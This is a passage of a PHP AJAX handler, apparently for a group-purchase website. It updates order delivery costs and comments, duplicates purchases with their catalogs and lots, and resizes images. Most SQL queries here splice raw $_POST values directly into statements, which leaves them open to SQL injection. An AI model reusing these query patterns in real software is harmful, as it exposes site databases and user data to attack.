				WHERE user_id='.$_POST['user_id'].' AND purchase_id='.$_POST['purchase_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'set_personal_puor':
			$sql = 'UPDATE '.PURCHASES_ORSERS_TABLE.'
				SET personal_puor="'.$_POST['pour_text'].'"
				WHERE user_id='.$_POST['user_id'].' AND purchase_id='.$_POST['purchase_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'set_user_purchase_comment':
			$sql = 'UPDATE '.PURCHASES_ORSERS_TABLE.'
				SET puor_comment="'.$_POST['comment'].'"
				WHERE user_id='.$_POST['user_id'].' AND purchase_id='.$_POST['purchase_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'set_delivery':
			foreach ($_POST['orders'] as $v){
				$sql = 'UPDATE '.ORDERS_TABLE.'
					SET order_delivery = '.(str_replace(',','.',$_POST['value'])+1-1).'
					WHERE order_id='.$v;

				$db->sql_query($sql);
				$arr['processed'][]=$v;
			}
			$arr['state']="ok";
			exit (json_encode($arr));
			break;
		case 'set_delivery_p':
			$oid='';
			$f=0;
			foreach ($_POST['orders'] as $v){
				if($f==1) $oid.=',';
				$oid.=$v;
				$f=1;
			}
			$sql = 'SELECT SUM(' . LOTS_TABLE . '.lot_cost) AS sum
					FROM ' . ORDERS_TABLE . '
					JOIN ' . LOTS_TABLE . ' ON ' . ORDERS_TABLE . '.lot_id = ' . LOTS_TABLE . '.lot_id 
					WHERE ' . ORDERS_TABLE . '.order_id IN (' . $oid . ')';
			$result=$db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			$sum = $row['sum'];
			$sql = 'SELECT ' . LOTS_TABLE . '.lot_cost, ' . ORDERS_TABLE . '.order_id
					FROM ' . ORDERS_TABLE . '
					JOIN ' . LOTS_TABLE . ' ON ' . ORDERS_TABLE . '.lot_id = ' . LOTS_TABLE . '.lot_id 
					WHERE ' . ORDERS_TABLE . '.order_id IN (' . $oid . ')';
			$resultl=$db->sql_query($sql);
			$id = 0;
			while ($rowl = $db->sql_fetchrow($resultl)) {
				$sql = 'UPDATE '.ORDERS_TABLE.'
					SET order_delivery = '.(str_replace(',','.',$_POST['value'])+1-1)*($rowl['lot_cost']/$sum).'
					WHERE order_id='.$rowl['order_id'];
				$db->sql_query($sql);
				$arr['processed'][$id]['id']=$rowl['order_id'];
				$arr['processed'][$id]['val']=$_POST['value']*($rowl['lot_cost']/$sum);
				$id++;
			
			}
			
			$arr['state']="ok";
			exit (json_encode($arr));
			
			break;
		case 'copypurchase':
			$reserv_id = $_POST['reserv_id'];
//			error_log($reserv_id,0);

			$nw = $_POST['nw'];
			$sql = 'INSERT INTO '.RESERVS_TABLE.'
			 (brand_id,user_id,request_send,request_confirm,productcat_id,status) 
				SELECT brand_id,user_id,request_send,request_confirm,productcat_id,\'3\' FROM '.RESERVS_TABLE.' WHERE reserv_id='.$reserv_id.'
			 ';
			 $db->sql_query($sql);
			$reserv_id2 = $db->sql_nextid();
			$sql = 'INSERT INTO '.PURCHASES_TABLE.'
			 (purchase_name,site_url,reserv_id,purchase_description,purchases_rule1,purchases_rule2,purchases_rule3,purchases_rule4,purchases_rule5,purchases_rule6,purchases_rule7,purchases_rule8,purchases_rule9,joomla_material_id) 
				SELECT purchase_name,site_url,\''.$reserv_id2.'\',purchase_description,purchases_rule1,purchases_rule2,purchases_rule3,purchases_rule4,purchases_rule5,purchases_rule6,purchases_rule7,purchases_rule8,purchases_rule9,joomla_material_id FROM '.PURCHASES_TABLE.' WHERE reserv_id='.$reserv_id.'
			 ';
			 $db->sql_query($sql);
			 
			$purchase_id2 = $db->sql_nextid();
			$sql= 'UPDATE ' . PURCHASES_TABLE . ' SET purchase_status_create="'.date('Y-m-d').'" WHERE purchase_id='.$purchase_id2;
			$db->sql_query($sql);
			$sql= 'UPDATE ' . PURCHASES_TABLE . ' SET purchase_status_open="'.date('Y-m-d').'" WHERE purchase_id='.$purchase_id2;
			$db->sql_query($sql);
			
			$sql = 'select purchase_id from '.PURCHASES_TABLE.' WHERE reserv_id='.$reserv_id;
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			$purchase_id = $row['purchase_id'];

			$sql = 'select catalog_id from '.CATALOGS_TABLE.' WHERE purchase_id='.$purchase_id;
			$result = $db->sql_query($sql);

			while ($row = $db->sql_fetchrow($result)){
				$catalog_id = $row['catalog_id'];
				$sql2 = 'INSERT INTO '.CATALOGS_TABLE.'
				 (purchase_id,catalog_name,catalog_orgrate,catalog_properties,catalog_bundle) 
					SELECT '.$purchase_id2.',catalog_name,catalog_orgrate,catalog_properties,catalog_bundle from '.CATALOGS_TABLE.' WHERE catalog_id='.$catalog_id.'
				 ';
				 $db->sql_query($sql2);
				$catalog_id2 = $db->sql_nextid();
				$sql_l = 'select lot_id from '.LOTS_TABLE.' WHERE catalog_id='.$catalog_id;
				$result_lot = $db->sql_query($sql_l);
				while ($row_l = $db->sql_fetchrow($result_lot)){
					$lot_id=$row_l['lot_id'];
					$sql2 = 'INSERT INTO '.LOTS_TABLE.'
					 (catalog_id,lot_name,lot_cost,lot_orgrate,lot_properties,lot_description,lot_img,lot_hidden,lot_bundle) 
						SELECT '.$catalog_id2.',lot_name,lot_cost,lot_orgrate,lot_properties,lot_description,lot_img,lot_hidden,lot_bundle from '.LOTS_TABLE.' WHERE lot_id='.$lot_id.'
					 ';
					 $db->sql_query($sql2);
					 $lot_id2 = $db->sql_nextid();
					 if ($nw==1){
						 $sql3 = 'UPDATE ' . ORDERS_TABLE . ' SET lot_id=' . $lot_id2 . ' WHERE lot_id='. $lot_id .' AND order_status=0';
						 $db->sql_query($sql3);
						 $result_user = $db->sql_query('SELECT user_id FROM ' . ORDERS_TABLE . ' WHERE lot_id=' . $lot_id2);
						 while ($row_u = $db->sql_fetchrow($result_user)){
							 $sql5 = 'SELECT *
									FROM '.PURCHASES_ORSERS_TABLE.'
									WHERE purchase_id ='.$purchase_id2.'
										AND user_id='.$row_u['user_id'];
							 $row5 = $db->sql_fetchrow($db->sql_query($sql5));

							 if ($row5==''){
								$sql5 = 'INSERT INTO '.PURCHASES_ORSERS_TABLE.'
									(user_id,purchase_id)
									VALUES ('.$row_u['user_id'].','.$purchase_id2.')';
								$db->sql_query($sql5);
							 }
						 }
					 }
				}
			}
			echo ';ok;';
			break;
	}
}		
/***********************************************************************************
Функция img_resize(): генерация thumbnails
Параметры:
  $src             - имя исходного файла
  $dest            - имя генерируемого файла
  $width, $height  - ширина и высота генерируемого изображения, в пикселях
Необязательные параметры:
  $rgb             - цвет фона, по умолчанию - белый
  $quality         - качество генерируемого JPEG, по умолчанию - максимальное (100)
***********************************************************************************/ 
function img_resize($src, $dest, $width, $height, $rgb=0xFFFFFF, $quality=100, $max=false)
{
  if (!file_exists($src)) return false;
 
  $size = getimagesize($src);
 
  if ($size === false) return false;
 
  // Определяем исходный формат по MIME-информации, предоставленной
  // функцией getimagesize, и выбираем соответствующую формату
  // imagecreatefrom-функцию.
  $format = strtolower(substr($size['mime'], strpos($size['mime'], '/')+1));
  $icfunc = "imagecreatefrom" . $format;
  if (!function_exists($icfunc)) return false;

  $x_ratio = $width  / $size[0];
  $y_ratio = $height / $size[1];

  $ratio       = min($x_ratio, $y_ratio);
  $use_x_ratio = ($x_ratio == $ratio);
 
  if (!$max){
	$ratio = $ratio>1 ? 1 : $ratio;
  }
 
  $new_width   = floor($size[0] * $ratio);
  $new_height  = floor($size[1] * $ratio);
  $new_left    = $use_x_ratio  ? 0 : floor(($width - $new_width) / 2);
  $new_top     = !$use_x_ratio ? 0 : floor(($height - $new_height) / 2);
 
  $isrc = $icfunc($src);
//  $idest = imagecreatetruecolor($width, $height);
  $idest = imagecreatetruecolor($new_width, $new_height);
 
  imagefill($idest, 0, 0, $rgb);
//  imagecopyresampled($idest, $isrc, $new_left, $new_top, 0, 0,  
//    $new_width, $new_height, $size[0], $size[1]);
  imagecopyresampled($idest, $isrc, 0, 0, 0, 0,  
    $new_width, $new_height, $size[0], $size[1]);
 
  imagejpeg($idest, $dest, $quality);
 
  imagedestroy($isrc);
  imagedestroy($idest);
 
  return true;
 
}

?>